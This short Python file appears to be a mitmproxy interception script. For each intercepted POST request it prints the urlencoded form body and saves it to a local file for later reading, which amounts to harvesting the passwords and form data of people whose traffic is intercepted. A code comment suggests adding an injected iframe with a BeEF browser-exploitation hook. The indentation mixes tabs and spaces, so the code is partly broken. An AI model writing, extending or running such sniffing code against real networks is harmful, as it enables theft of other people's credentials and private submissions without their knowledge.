import io

'''
add more shit to this
maybe inject iframe containing beef hook here?

'''
def request(flow):
    #writes urlencoded data from POST request body to a file for reading later...
    if flow.request.urlencoded_form and flow.request.method == 'POST':
        form = flow.request.urlencoded_form
	    print(form)
	    f = open("test_urlencoded.txt", "w+")
	    f.write(str(form))
	    f.close()
